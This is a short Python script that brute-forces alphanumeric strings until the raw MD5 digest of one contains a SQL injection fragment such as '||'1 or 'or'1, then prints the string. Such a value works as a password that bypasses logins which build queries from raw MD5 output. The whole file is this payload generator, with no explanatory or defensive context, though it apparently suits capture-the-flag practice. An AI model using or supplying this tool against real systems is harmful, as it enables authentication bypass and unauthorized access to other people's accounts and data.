import hashlib
import string
import itertools

length = 5
chars = string.ascii_letters + string.digits  # "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

counter = 0
for item in itertools.product(chars, repeat=length):
    possibleString = ("".join(item))
    resulted = hashlib.md5(possibleString.encode('utf-8'))
    result = resulted.digest()
    if "\'||\'1" in str(result) or "\'||\'2" in str(result) or "\'||\'3" in str(result) or "\'||\'4" in str(result) or "\'||\'5" in str(result) or "\'||\'6" in str(result) or "\'||\'7" in str(result) or "\'||\'8" in str(result) or "\'||\'9" in str(result):
        print(possibleString)
        print(str(result))
        break
    if "\'or\'1" in str(result).lower() or "\'or\'2" in str(result).lower() or "\'or\'3" in str(result).lower() or "\'or\'4" in str(result).lower() or "\'or\'5" in str(result).lower() or "\'or\'6" in str(result).lower() or "\'or\'7" in str(result).lower() or "\'or\'8" in str(result).lower() or "\'or\'9" in str(result).lower():
        print(possibleString)
        print(str(result))
        break
    counter += 1
print(counter) 
